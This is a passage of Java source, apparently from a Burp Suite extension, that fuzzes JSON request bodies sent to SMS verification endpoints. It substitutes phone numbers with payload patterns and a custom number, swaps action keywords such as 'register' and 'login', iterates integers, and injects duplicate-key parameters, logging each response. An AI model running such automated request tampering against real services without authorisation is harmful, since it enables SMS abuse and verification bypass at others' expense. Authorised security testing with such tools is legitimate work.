                                IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                                TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, key + "_int", String.valueOf(i), responseLength, 0, responseCode, persistedTest);
                                testLog.add(testEntry);
                                ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                            }
                        }
                    }
                } else if (valueObj instanceof JSONObject || valueObj instanceof JSONArray) {
                    executed |= processJsonAndTest(valueObj, baseRequestResponse, headers, origEntry);
                }
            }
        } else if (json instanceof JSONArray) {
            JSONArray arr = (JSONArray) json;
            for (int i = 0; i < arr.length(); i++) {
                Object element = arr.get(i);
                if (element instanceof String || element instanceof Number) {
                    String str = element.toString();
                    if (str.matches("^\\d{11}$")) {
                        executed = true;
                        for (String pattern : PAYLOAD_PATTERNS) {
                            String payload = pattern.replace("xxxxxxxxxxx", str);
                            if(payload.contains("18888888888")){
                                payload = payload.replace("18888888888", customPhoneNumber);
                            }
                            JSONArray newArr = new JSONArray(arr.toString());
                            newArr.put(i, payload);
                            byte[] bodyBytes = newArr.toString().getBytes(StandardCharsets.UTF_8);
                            byte[] newRequest = helpers.buildHttpMessage(headers, bodyBytes);
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                            int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, "[" + i + "]", payload, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                        }
                    }
                    if (smsInterfaceTestEnabled && isSmsKeyword(str)) {
                        executed = true;
                        String[] keywords = {"register", "reg", "regist", "login", "recall", "retrieve", "ret", "true", "false"};
                        for (String kw : keywords) {
                            if (!kw.equalsIgnoreCase(str)) {
                                JSONArray newArr = new JSONArray(arr.toString());
                                newArr.put(i, kw);
                                byte[] bodyBytes = newArr.toString().getBytes(StandardCharsets.UTF_8);
                                byte[] newRequest = helpers.buildHttpMessage(headers, bodyBytes);
                                IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                                int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                                int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                                IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                                TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, "[" + i + "]_sms", kw, responseLength, 0, responseCode, persistedTest);
                                testLog.add(testEntry);
                                ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                            }
                        }
                    }
                    if (smsInterfaceTestEnabled && isInteger(str) && isInRange(str)) {
                        executed = true;
                        int origInt = Integer.parseInt(str);
                        for (int j = -100; j <= 100; j++) {
                            if (j != origInt) {
                                JSONArray newArr = new JSONArray(arr.toString());
                                newArr.put(i, String.valueOf(j));
                                byte[] bodyBytes = newArr.toString().getBytes(StandardCharsets.UTF_8);
                                byte[] newRequest = helpers.buildHttpMessage(headers, bodyBytes);
                                IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                                int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                                int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                                IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                                TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, "[" + i + "]_int", String.valueOf(j), responseLength, 0, responseCode, persistedTest);
                                testLog.add(testEntry);
                                ((ResultTableModel) resultTable.getModel()).fireTableDataChanged();
                            }
                        }
                    }
                } else if (element instanceof JSONObject || element instanceof JSONArray) {
                    executed |= processJsonAndTest(element, baseRequestResponse, headers, origEntry);
                }
            }
        }
        return executed;
    }

    // 简单判断：如果请求体以 { 开头则解析为JSONObject，否则若以 [ 开头则解析为JSONArray
    private Object parseJson(String body) throws JSONException {
        body = body.trim();
        if (body.startsWith("{"))
            return new JSONObject(body);
        else if (body.startsWith("["))
            return new JSONArray(body);
        else
            throw new JSONException("不是有效的JSON格式");
    }

    // 辅助方法：判断字符串是否为短信接口关键字
    private boolean isSmsKeyword(String value) {
        String[] keywords = {"register", "reg", "regist", "login", "recall", "retrieve", "ret", "true", "false"};
        for (String kw : keywords) {
            if (value.equalsIgnoreCase(kw)) {
                return true;
            }
        }
        return false;
    }

    // 辅助方法：判断是否为整数
    private boolean isInteger(String value) {
        try {
            Integer.parseInt(value);
            return true;
        } catch (NumberFormatException ex) {
            return false;
        }
    }

    // 辅助方法：判断整数是否在-100到100之间
    private boolean isInRange(String value) {
        try {
            int num = Integer.parseInt(value);
            return (num >= -100 && num <= 100);
        } catch(Exception ex) {
            return false;
        }
    }

    // 辅助方法：通过手工组装JSON字符串实现重复key（duplicate parameter）的效果
    private String addDuplicateParameterToJson(JSONObject obj, String targetKey, String dupValue) {
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        boolean first = true;
        // 注意：JSONObject的keySet()遍历顺序可能与原始字符串不同
        for (String k : obj.keySet()) {
            if (!first) {
                sb.append(",");
            }
            first = false;
            Object value = obj.get(k);
            sb.append("\"").append(k).append("\":");
            if (k.equals(targetKey)) {
                // 输出原始key-value
                sb.append("\"").append(value.toString()).append("\"");
                // 追加重复的相同key，值为用户自定义号码
                sb.append(",\"").append(k).append("\":\"").append(dupValue).append("\"");
            } else {
                if (value instanceof JSONObject || value instanceof JSONArray) {
                    sb.append(value.toString());
                } else if (value instanceof Number || value instanceof Boolean) {
                    sb.append(value.toString());
                } else {
                    sb.append("\"").append(value.toString()).append("\"");
                }
            }
        }
        sb.append("}");
        return sb.toString();
    }

    // 根据当前选中的原始请求id，返回对应的测试日志列表
    private List<TestLogEntry> getFilteredTestLog() {
        List<TestLogEntry> filtered = new ArrayList<>();
        for (TestLogEntry entry : testLog) {
            if (entry.originalId == selectedOriginalId) {
                filtered.add(entry);
            }
        }
        return filtered;
    }

    // --- 以下为表格模型实现（原始请求表格由当前类继承 AbstractTableModel） ---
    @Override
    public int getRowCount() {
        return originalLog.size();
    }

    @Override
    public int getColumnCount() {
        return 3;
    }

    @Override
    public String getColumnName(int columnIndex) {
        switch (columnIndex) {
            case 0:
                return "#";
            case 1:
                return "URL";
            case 2:
                return "状态";
            default:
                return "";
        }
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex) {
        OriginalLogEntry entry = originalLog.get(rowIndex);
        switch (columnIndex) {
            case 0:
                return entry.id;
            case 1:
                return entry.url.toString();
            case 2:
                return entry.state;
            default:
                return "";
        }
    }

    // --- 内部类：原始请求日志实体 ---
    private static class OriginalLogEntry {
        int id;
        int tool;
        IHttpRequestResponsePersisted requestResponse;
        URL url;
        String state;

        OriginalLogEntry(int id, IHttpService service, URL url, IHttpRequestResponsePersisted reqResp, String state) {
            this.id = id;
            this.tool = service.getPort();
            this.url = url;
            this.requestResponse = reqResp;
            this.state = state;
        }
    }

    // --- 内部类：测试日志实体 ---
    private static class TestLogEntry {
        int id;
        int originalId;
        String parameter;
        String payload;
        int responseLength;
        int responseTime;
        int responseCode;
        IHttpRequestResponsePersisted requestResponse;

        TestLogEntry(int id, int originalId, String parameter, String payload, int responseLength, int responseTime, int responseCode, IHttpRequestResponsePersisted reqResp) {
            this.id = id;
            this.originalId = originalId;
            this.parameter = parameter;
            this.payload = payload;
            this.responseLength = responseLength;
            this.responseTime = responseTime;
            this.responseCode = responseCode;
            this.requestResponse = reqResp;
        }
    }

    // --- 内部类：测试结果表格模型 ---
    private class ResultTableModel extends AbstractTableModel {
        private List<TestLogEntry> filtered = new ArrayList<>();

        public void setFilter(int originalId) {
            filtered.clear();
            for (TestLogEntry entry : testLog) {
                if (entry.originalId == originalId) {
                    filtered.add(entry);
                }
            }
            fireTableDataChanged();
        }

        @Override
        public int getRowCount() {
            return filtered.size();
        }

        @Override
        public int getColumnCount() {
            return 5;
        }

        @Override
        public String getColumnName(int columnIndex) {
            switch (columnIndex) {
                case 0:
                    return "参数";
                case 1:
                    return "Payload";
                case 2:
                    return "响应长度";
                case 3:
                    return "耗时(ms)";
                case 4:
                    return "响应码";
                default:
                    return "";
            }
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            TestLogEntry entry = filtered.get(rowIndex);
            switch (columnIndex) {
                case 0:
                    return entry.parameter;
                case 1:
                    return entry.payload;
                case 2:
                    return entry.responseLength;
                case 3:
                    return entry.responseTime;
                case 4:
                    return entry.responseCode;
                default:
                    return "";
            }
        }
    }
}
